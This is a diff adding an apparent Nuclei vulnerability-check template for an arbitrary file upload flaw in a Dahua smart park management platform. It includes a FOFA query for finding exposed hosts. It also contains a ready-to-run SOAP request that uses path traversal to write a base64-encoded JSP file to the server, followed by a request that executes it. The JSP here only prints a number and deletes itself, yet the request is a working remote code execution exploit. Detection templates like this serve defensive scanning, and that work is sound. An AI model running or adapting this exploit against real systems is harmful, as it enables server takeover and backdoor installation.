@@ -1,0 +1,41 @@
+id: dahua-smart-park-bitmap-upload
+ 
+info:
+  name: 大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞 恶意攻击者可能会上传后门文件 造成服务器失陷
+  author: Abbbbb
+  severity: critical
+  metadata: 
+    fofa-query: app="dahua-智慧园区综合管理平台"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        POST /emap/webservice/gis/soap/bitmap HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+        
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+            <soapenv:Header/>           
+              <soapenv:Body>
+                    <res:uploadPicFile>
+                            <arg0>
+                          <picPath>/../{{filename}}.jsp</picPath>
+                            </arg0>
+                            <arg1>PCVvdXQucHJpbnQoMTExICogMTExKTtuZXcgamF2YS5pby5GaWxlKGFwcGxpY2F0aW9uLmdldFJlYWxQYXRoKHJlcXVlc3QuZ2V0U2VydmxldFBhdGgoKSkpLmRlbGV0ZSgpOyU+</arg1>
+                        </res:uploadPicFile>
+            </soapenv:Body>
+        </soapenv:Envelope>
+ 
+      - |
+        GET /upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+ 
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2==200 && contains_all(body_2,"12321")
